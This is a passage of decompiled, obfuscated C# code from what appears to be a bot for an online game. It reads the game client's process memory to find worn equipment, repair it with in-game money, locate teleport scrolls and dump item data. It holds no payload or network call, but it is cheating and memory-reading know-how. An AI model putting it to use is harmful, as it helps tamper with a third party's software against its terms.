			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_43.uint_0, array2, 4, ref int_2);
			int num17 = BitConverter.ToInt32(array2, 0);
			if (num17 != num10)
			{
				break;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_27.uint_0, array2, 4, ref int_2);
			int num18 = BitConverter.ToInt32(array2, 0);
			if (num18 != num11)
			{
				break;
			}
			int num19 = 0;
			while (Class89.smethod_12(characterAccountConfig_0) == 1)
			{
				Thread.Sleep(100);
				if (num19 > 100)
				{
					break;
				}
				num19++;
			}
			if (num14 <= num15)
			{
				break;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num13 + (num16 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_2);
			uint num20 = BitConverter.ToUInt32(array2, 0);
			if (num20 == 0)
			{
				continue;
			}
			uint num21 = num12 + num20 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_2);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_2);
			if (array[0] == 0)
			{
				continue;
			}
			num15++;
			uint num22 = num13 + num16 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num22 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_2);
			int num23 = array[0];
			if (num23 != 2)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_2);
			int num24 = array[0];
			if (num24 != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_110.uint_0, array, 1, ref int_2);
			int num25 = array[0];
			if (num25 == 3 || num25 == 4 || num25 > 8)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_119.uint_0, array2, 4, ref int_2);
			int num26 = BitConverter.ToInt32(array2, 0);
			if (num26 <= 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_119.uint_0 + 4, array2, 4, ref int_2);
			int num27 = BitConverter.ToInt32(array2, 0);
			if (num27 <= 0 || num27 <= num26 || ((int_1 <= 0 || num26 > int_1) && (int_0 <= 0 || num26 * 100 / num27 > int_0) && (int_1 > 0 || int_0 > 0)))
			{
				continue;
			}
			string text2 = null;
			string text3 = null;
			int i = 0;
			int num28 = 0;
			int num29 = 0;
			if (!flag && num10 <= 0)
			{
				uint num30 = Class38.smethod_41(characterAccountConfig_0, bool_0: true);
				if (Form1.int_67[0] > 0)
				{
					if (num30 > Form1.int_67[1] * 10000)
					{
						num30 = (uint)(Form1.int_67[1] * 10000);
					}
				}
				else if (num30 > 6000000)
				{
					num30 = 6000000u;
				}
				if (num30 != 0 && Class75.smethod_37(characterAccountConfig_0, num30))
				{
					for (; i < 10; i++)
					{
						Thread.Sleep(100);
						Class38.smethod_41(characterAccountConfig_0, bool_0: true);
						if (Class38.smethod_41(characterAccountConfig_0, bool_0: true) != num30)
						{
							break;
						}
					}
				}
				flag = true;
			}
			uint num31 = Class38.smethod_41(characterAccountConfig_0);
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_107.uint_0, byte_, 29, ref int_2);
			string text4 = Class1.smethod_3(byte_);
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_119.uint_0 + uint_0, array2, 4, ref int_2);
			int num32 = BitConverter.ToInt32(array2, 0);
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_109.uint_0, array2, 4, ref int_2);
			int num33 = BitConverter.ToInt32(array2, 0);
			if (num33 != 1 && num33 != 4)
			{
				num29 = Class75.smethod_22(characterAccountConfig_0, num20);
				if (num29 > 0)
				{
					if (num29 > num31)
					{
						uint num34 = Class38.smethod_41(characterAccountConfig_0, bool_0: true);
						if (num34 == 0 || num29 - num31 > num34)
						{
							num28 = 1;
							goto IL_086c;
						}
						Class75.smethod_37(characterAccountConfig_0, (uint)(num29 - num31));
						Thread.Sleep(150);
					}
					if (!flag2 && (bool_3 || num10 > 0))
					{
						Class89.smethod_4(characterAccountConfig_0);
						Thread.Sleep(600 - num10 * 300);
						Class75.smethod_27(characterAccountConfig_0);
						flag2 = true;
					}
					Class75.smethod_20(characterAccountConfig_0, num20);
					goto IL_086c;
				}
			}
			if (num33 == 4 && (Form1.int_64 <= 0 || num32 > 5))
			{
				num29 = 0;
			}
			else
			{
				Class95.smethod_8(characterAccountConfig_0);
				if (!flag2 && (bool_3 || num10 > 0))
				{
					Class89.smethod_4(characterAccountConfig_0);
					Thread.Sleep(600 - num10 * 300);
					Class75.smethod_27(characterAccountConfig_0);
					flag2 = true;
				}
				i = 0;
				while (i < 100 && Class75.smethod_3(characterAccountConfig_0, Class75.uint_5, 4) > 0)
				{
					i++;
					Thread.Sleep(100);
				}
				num = 1;
				num2++;
				Class75.smethod_2(characterAccountConfig_0, Class75.uint_5, 1, 4);
				Class75.smethod_20(characterAccountConfig_0, num20);
				i = 0;
				int num35 = 0;
				while (true)
				{
					if (num35 <= 0)
					{
						Thread.Sleep(30);
						if (0 <= Class95.smethod_0(characterAccountConfig_0))
						{
							num24 = Class95.smethod_0(characterAccountConfig_0);
							num35 = Class95.smethod_1(characterAccountConfig_0, num24);
						}
						if (i <= 35)
						{
							i++;
							continue;
						}
						num29 = 0;
						break;
					}
					int num36 = -1;
					string text5 = null;
					for (int j = 0; j < num35; j++)
					{
						string text6 = Class95.smethod_3(characterAccountConfig_0, j, num24, 128);
						string string_ = text6.ToLower();
						if (Class11.smethod_1(string_, "Söa".ToLower()) >= 0)
						{
							num36 = j;
							text5 = text6;
							if (0 <= Class11.smethod_1(string_, "kü".ToLower()))
							{
								break;
							}
						}
					}
					if (num36 >= 0)
					{
						int num37 = 0;
						int num38 = 0;
						for (int k = 0; k < text5.Length; k++)
						{
							bool flag3 = '0' <= text5[k] && text5[k] <= '9';
							if (num37 == 0 && flag3)
							{
								num37 = 1;
							}
							else if (num37 == 1 && !flag3)
							{
								num37 = 2;
							}
							if (num37 == 1)
							{
								text2 += text5[k];
							}
							if (num37 == 2)
							{
								if (num38 == 0 && flag3)
								{
									num38 = 1;
								}
								else if (num38 == 1 && !flag3)
								{
									break;
								}
								if (num38 == 1)
								{
									text3 += text5[k];
								}
							}
						}
						num29 = Class11.smethod_11(text2) * 10000 + Class11.smethod_11(text3);
						if (num29 <= num31)
						{
							i = 0;
							Class95.smethod_5(characterAccountConfig_0, num36);
							while (!Class11.bool_0)
							{
								Thread.Sleep(30);
								if (!Class95.Class92.smethod_4(characterAccountConfig_0))
								{
									if (Class95.smethod_0(characterAccountConfig_0) < 0)
									{
										break;
									}
									if (i <= 30)
									{
										i++;
										continue;
									}
									Class95.smethod_8(characterAccountConfig_0);
									break;
								}
								Class95.Class92.smethod_5(characterAccountConfig_0);
								break;
							}
						}
						else
						{
							Class95.smethod_8(characterAccountConfig_0);
							num28 = 1;
						}
					}
					else
					{
						Class95.smethod_8(characterAccountConfig_0);
						num29 = 0;
					}
					break;
				}
			}
			goto IL_086c;
			IL_086c:
			Thread.Sleep(100);
			if (num > 0)
			{
				Class75.smethod_2(characterAccountConfig_0, Class75.uint_5, 0, 4);
				num = 0;
			}
			num3 += num28;
			string empty = string.Empty;
			empty = ((num28 > 0) ? Class11.smethod_61("...", int_3) : ((text2 != null || text3 != null) ? Class11.smethod_61(text2 + "," + text3, int_3) : ((num29 <= 0) ? Class11.smethod_61("Bá qua", int_3) : Class11.smethod_61(num29, int_3))));
			object obj = text;
			text = string.Concat(obj, '\r', Class11.smethod_61(num26 + "/" + num27, int_3), "|", empty, "|", text4);
			if (array3 != null)
			{
				Array.Resize(ref array3, array3.Length + 1);
			}
			else
			{
				array3 = new GStruct34[1];
			}
			int num39 = array3.Length - 1;
			num21 = num12 + num20 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num21 + Class56.memorySignatureScanConfig_119.uint_0, array2, 4, ref int_2);
			num26 = BitConverter.ToInt32(array2, 0);
			array3[num39].int_0 = num26;
			array3[num39].int_1 = num27;
			array3[num39].int_2 = num32;
			array3[num39].int_3 = num33;
			array3[num39].uint_0 = num16;
			array3[num39].uint_1 = num20;
			array3[num39].string_0 = text4;
		}
		if (flag)
		{
			uint num40 = Class38.smethod_41(characterAccountConfig_0);
			if (num40 > num4)
			{
				Class75.smethod_38(characterAccountConfig_0, num40 - num4);
			}
		}
		if (text != null && text != string.Empty)
		{
			string text7 = string.Empty;
			if (num3 > 0)
			{
				text7 = " (thiÕu tiÒn söa: " + num3 + ")";
			}
			if (Form1.int_71 <= 0)
			{
				Class75.smethod_52(characterAccountConfig_0, "<bclr=yellow>Söa §å T¹i Chç" + text7 + "<bclr><color=green>\r" + Class11.smethod_61("§é bÒn", int_3) + "|" + Class11.smethod_61("TiÒn", int_3) + "|Tªn trang bÞ<bclr=blue>" + text);
			}
			else
			{
				Class75.smethod_52(characterAccountConfig_0, text);
			}
		}
		Thread.Sleep(300);
		if (array3 != null)
		{
			for (int l = 0; l < array3.Length; l++)
			{
				uint num41 = num12 + array3[l].uint_1 * Class56.memorySignatureScanConfig_106.uint_0;
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num41 + Class56.memorySignatureScanConfig_119.uint_0, array2, 4, ref int_2);
				array3[l].int_0 = BitConverter.ToInt32(array2, 0);
			}
		}
		if (num2 > 0)
		{
			Class95.smethod_8(characterAccountConfig_0);
			Class75.smethod_2(characterAccountConfig_0, Class75.uint_5, 0, 4);
		}
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_2);
		num5 = BitConverter.ToUInt32(array2, 0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num5 + Class56.memorySignatureScanConfig_13.uint_0, array2, 4, ref int_2);
		num6 = BitConverter.ToUInt32(array2, 0);
		num7 = num6 * Class56.memorySignatureScanConfig_15.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_14.uint_0, array2, 4, ref int_2);
		num8 = BitConverter.ToUInt32(array2, 0);
		num9 = num8 + num7;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num9 + Class56.memorySignatureScanConfig_43.uint_0, array2, 4, ref int_2);
		int num42 = BitConverter.ToInt32(array2, 0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_27.uint_0, array2, 4, ref int_2);
		int num43 = BitConverter.ToInt32(array2, 0);
		if (num42 != num10 || num43 != num11)
		{
			array3 = new GStruct34[1]
			{
				new GStruct34
				{
					string_0 = "CHANGE"
				}
			};
		}
		return array3;
	}

	public static uint[,] smethod_41(CharacterAccountConfig characterAccountConfig_0)
	{
		int int_ = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_);
		uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array2, 0);
		string text = "ThÇn Hµnh Phï";
		string value = text.Replace(" ", string.Empty).ToLower();
		byte[] array3 = new byte[text.Length + 2];
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		uint[,] array4 = new uint[2, 2];
		for (uint num5 = 1u; num5 < Class56.int_1; num5++)
		{
			if (num3 <= num4)
			{
				break;
			}
			if (array4[1, 0] != 0 && array4[0, 0] != 0)
			{
				break;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num + (num5 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_);
			uint num6 = BitConverter.ToUInt32(array2, 0);
			if (num6 == 0)
			{
				continue;
			}
			uint num7 = num2 + num6 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_);
			if (array[0] == 0)
			{
				continue;
			}
			num4++;
			uint num8 = num + num5 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_);
			int num9 = array[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_);
			int num10 = array[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_110.uint_0, array, 1, ref int_);
			int num11 = array[0];
			switch (num9)
			{
			case 3:
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_);
				string text2 = Class1.smethod_3(array3);
				if (!(text2 != text) || text2.Replace(" ", string.Empty).ToLower().IndexOf(value) >= 0)
				{
					array4[1, 0] = num5;
					array4[1, 1] = num6;
				}
				break;
			}
			case 2:
				if (num10 == 0 && num11 == 10)
				{
					array4[0, 0] = num5;
					array4[0, 1] = num6;
				}
				break;
			}
		}
		return array4;
	}

	public static uint[] smethod_42(CharacterAccountConfig characterAccountConfig_0)
	{
		int int_ = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		byte[] array3 = new byte[25];
		string[] array4 = new string[3] { "th????a?ph", "h?i?th?nh?ph", "ÍÁµØ·û" };
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_);
		uint num = BitConverter.ToUInt32(array2, 0);
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		for (uint num5 = 1u; num5 < Class56.int_1 && num3 > num4; num5++)
		{
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num2 + (num5 * 5 + Class56.memorySignatureScanConfig_99.uint_0) * 4, array2, 4, ref int_);
			uint num6 = BitConverter.ToUInt32(array2, 0);
			if (num6 == 0)
			{
				continue;
			}
			uint num7 = num + num6 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_);
			if (array[0] == 0)
			{
				continue;
			}
			num4++;
			uint num8 = num2 + num5 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_);
			int num9 = array[0];
			if (num9 != 3)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_108.uint_0, array, 1, ref int_);
			int num10 = array[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_110.uint_0, array, 1, ref int_);
			int num11 = array[0];
			if (num10 != 5 || num11 != 0)
			{
				if (num10 != 6 || num11 != 1)
				{
					continue;
				}
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num7 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_);
				bool flag = true;
				for (int i = 0; i < array4.Length; i++)
				{
					flag = true;
					char[] array5 = array4[i].ToCharArray();
					for (int j = 0; j < array5.Length; j++)
					{
						byte b = array3[j];
						char c = array5[j];
						if (c != '?' && b != c && (b < 65 || 90 < b || b + 32 != c))
						{
							flag = false;
							break;
						}
					}
					if (flag)
					{
						break;
					}
				}
				if (!flag)
				{
					continue;
				}
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0 - 4, array, 1, ref int_);
			uint num12 = array[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_100.uint_0, array, 1, ref int_);
			uint num13 = array[0];
			return new uint[4] { num6, num5, num12, num13 };
		}
		return null;
	}

	public static string smethod_43(CharacterAccountConfig characterAccountConfig_0)
	{
		int int_ = 0;
		byte[] array = new byte[1];
		byte[] array2 = new byte[4];
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_11.uint_0, array2, 4, ref int_);
		uint num = BitConverter.ToUInt32(array2, 0) + Class56.memorySignatureScanConfig_97.uint_0;
		Class24.ReadProcessMemory(characterAccountConfig_0.int_137, Class56.memorySignatureScanConfig_105.uint_0, array2, 4, ref int_);
		uint num2 = BitConverter.ToUInt32(array2, 0);
		byte[] array3 = new byte[80];
		int num3 = smethod_4(characterAccountConfig_0);
		int num4 = 0;
		string text = "ID\tIdex\tBox\tKind\tGenre\tParticular\tChungLoai\tWidth\tHeigh\tName\tNameU\t 6 dòng thuộc tính {ID:Min:Max}...";
		for (uint num5 = 1u; num5 < Class56.int_1; num5++)
		{
			if (num3 <= num4)
			{
				break;
			}
			uint num6 = num + num5 * 20;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_99.uint_0 * 4, array2, 4, ref int_);
			uint num7 = BitConverter.ToUInt32(array2, 0);
			if (num7 == 0)
			{
				continue;
			}
			string text2 = num5 + "\t" + num7;
			uint num8 = num2 + num7 * Class56.memorySignatureScanConfig_106.uint_0;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_106.uint_0 - 4, array2, 4, ref int_);
			if (BitConverter.ToInt32(array2, 0) != 0)
			{
				continue;
			}
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array, 1, ref int_);
			if (array[0] == 0)
			{
				continue;
			}
			num4++;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num6 + Class56.memorySignatureScanConfig_100.uint_0 - 8, array, 1, ref int_);
			text2 = text2 + "\t" + array[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_108.uint_0, array2, 1, ref int_);
			text2 = text2 + "\t" + array2[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_110.uint_0, array2, 4, ref int_);
			int num9 = BitConverter.ToInt32(array2, 0);
			text2 = text2 + "\t" + num9;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + uint_1, array2, 4, ref int_);
			int num10 = BitConverter.ToInt32(array2, 0);
			text2 = text2 + "\t" + num10;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + uint_1 + 4, array2, 4, ref int_);
			int num11 = BitConverter.ToInt32(array2, 0);
			text2 = text2 + "\t" + num11;
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_111.uint_0, array2, 1, ref int_);
			text2 = text2 + "\t" + array2[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_112.uint_0, array2, 1, ref int_);
			text2 = text2 + "\t" + array2[0];
			Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_107.uint_0, array3, array3.Length, ref int_);
			string text3 = Class1.smethod_3(array3);
			string text4 = text2;
			text2 = text4 + "\t|" + text3 + "|\t|" + Class1.smethod_1(text3, 1) + "|";
			string text5 = string.Empty;
			for (uint num12 = 0u; num12 < 6; num12++)
			{
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_118.uint_0 + num12 * 16, array2, 4, ref int_);
				int num13 = BitConverter.ToInt32(array2, 0);
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_118.uint_0 + num12 * 16 + 4, array2, 4, ref int_);
				int num14 = BitConverter.ToInt32(array2, 0);
				Class24.ReadProcessMemory(characterAccountConfig_0.int_137, num8 + Class56.memorySignatureScanConfig_118.uint_0 + num12 * 16 + 12, array2, 4, ref int_);
				int num15 = BitConverter.ToInt32(array2, 0);
				if (text5 != string.Empty)
				{
					text5 += " ";
				}
				object obj = text5;
				text5 = string.Concat(obj, num12, "{", num13, ":", num14, ":", num15, "}");
			}
			text2 = text2 + "\t" + text5;
			text = text + Class56.string_7 + text2;
		}
		return text;
	}
}
